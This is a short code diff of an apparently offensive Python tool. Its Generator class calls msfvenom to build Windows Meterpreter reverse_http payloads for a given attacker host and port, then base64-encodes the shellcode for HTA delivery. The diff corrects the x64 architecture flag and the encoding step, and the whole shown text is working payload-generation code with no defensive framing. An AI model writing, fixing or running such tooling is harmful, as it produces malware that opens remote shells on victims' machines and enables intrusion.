@@ -24,7 +24,7 @@ class Generator():
 		if (arch  == "x86"):
 			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
 		else:
-			os.system("msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
+			os.system("msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
 
 		with open("/tmp/metasploit", 'rb') as f:
 			code = f.read()
@@ -54,8 +54,9 @@ class Generator():
 
 	def b64Encode(self, code):
 		#HTA-Shellcode
-		shellcode = str(base64.b64encode(code))
+		shellcode = str(base64.b64encode(code.encode('utf-8')))
 		shellcode = shellcode[2:-1]
+
 		return shellcode
 
 	def decEncode(self, shellcode):
